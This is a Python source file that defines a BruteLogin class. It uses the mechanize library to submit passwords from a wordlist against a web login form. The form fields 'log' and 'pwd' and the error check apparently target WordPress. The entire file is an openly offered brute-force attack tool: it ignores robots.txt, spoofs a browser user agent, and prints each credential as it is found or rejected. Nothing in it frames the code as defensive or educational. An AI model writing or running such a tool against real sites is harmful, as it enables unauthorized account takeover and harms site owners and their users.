import re
import mechanize


class BruteLogin:
    def __init__(self, username, wordlist, url):
        self.username = username
        self.wordlist = wordlist
        self.url = url
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.useragent = [
            ('User-agent', 'Mozilla/5.0 (X11;U;Linux 2.4.2.-2 i586; en-us;m18) Gecko/200010131 Netscape6/6.01')
        ]
        self.br.addheaders = self.useragent

    def fill_form(self, password):
        try:
            self.br.open(self.url, timeout=120)
            self.br.select_form(nr=0)
        except Exception as e:
            print(e)

        try:
            self.br.form['log'] = self.username
        except Exception as e:
            print(e)

        try:
            self.br.form['pwd'] = password
        except Exception as e:
            print(e)

    def submit_form(self, password):
        self.response = self.br.submit()
        page_content = self.br.response().read()
        match = re.search(f"<strong>ERROR</strong>", str(page_content))
        password = password.strip()

        if match:
            print(f"{self.username}:{password} - Bad Password")
        else:
            print(f"{self.username}:{password} found!")
            return True
